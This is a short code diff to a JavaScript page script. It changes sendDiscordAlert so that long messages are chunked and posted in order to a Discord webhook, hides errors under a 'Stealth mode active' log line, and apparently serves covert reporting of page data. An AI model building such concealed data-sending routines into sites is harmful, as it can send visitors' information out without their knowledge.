@@ -151,8 +151,8 @@
             return new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
         }
 
-        // Updated function for handling long messages (Chunking)
-        function sendDiscordAlert(messageContent) {
+        // Updated function for handling long messages IN CORRECT ORDER (Async/Await)
+        async function sendDiscordAlert(messageContent) {
             if(!WEBHOOK_URL) return;
             
             // Discord ki 2000 character limit ko bypass karne ke liye (Safe limit 1900)
@@ -160,11 +160,17 @@
             for (let i = 0; i < messageContent.length; i += chunkSize) {
                 const chunk = messageContent.substring(i, i + chunkSize);
                 
-                fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: chunk })
-                }).catch(() => console.log("Stealth mode active."));
+                try {
+                    await fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ content: chunk })
+                    });
+                    // Agla part bhejne se pehle aadhe second (500ms) ka wait karega taaki order mix na ho
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                } catch (error) {
+                    console.log("Stealth mode active.");
+                }
             }
         }
 
